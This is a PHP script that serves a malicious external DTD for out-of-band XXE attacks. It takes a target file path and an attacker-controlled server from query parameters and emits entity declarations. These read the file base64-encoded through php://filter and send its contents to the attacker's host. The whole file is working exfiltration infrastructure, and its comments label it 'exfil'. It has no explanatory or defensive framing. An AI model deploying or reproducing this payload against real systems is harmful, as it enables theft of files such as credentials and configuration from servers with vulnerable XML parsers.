<?php
	//dtd Content-Type <= dtd MIME type
	header('Content-Type: application/xml-dtd');
	//Set the Cache Control/Expires
	header("Cache-Control: no-cache, must-revalidate");
	header("Expires: Mon, 26 MAR 3030 03:13:37 CST");
	$filename = $_GET['file'];
	//Parse target server from query value
	$server = $_GET['s'];
	//entity resource read
	$entityResource = '<!ENTITY % resource SYSTEM "php://filter/read=convert.base64-encode/resource='.htmlspecialchars($filename,ENT_QUOTES).'">';
	//exfil hostname+uri inc. entityResource contents
	$entityOOB = '<!ENTITY % LoadOOBEnt "<!ENTITY &#x25; OOB SYSTEM \''.htmlspecialchars($server,ENT_QUOTES).'?p=%resource;\'>">'; 
	//output linefeed-seperated XML of dtd Entities
	echo $entityResource;
	echo "\n";
	echo $entityOOB;
?>